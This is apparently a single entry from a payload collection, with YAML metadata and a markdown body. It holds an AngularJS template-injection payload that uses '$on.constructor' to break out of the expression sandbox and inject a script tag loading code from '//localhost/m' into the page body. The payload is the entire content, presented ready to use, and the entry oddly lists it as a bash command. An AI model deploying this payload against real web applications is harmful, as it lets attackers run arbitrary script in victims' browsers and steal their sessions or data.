---
id: 5cea3e45-7b12-46a9-a0e6-980d309262d8
name: Run Script to create element
type: command
executor: bash
data: "{{\n    $on.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n\
  \    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}"
output: null
created_at: '2023-04-06T03:56:43.760369+00:00'
updated_at: '2023-04-10T20:24:53.211874+00:00'
---

# Run Script to create element

```bash
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```
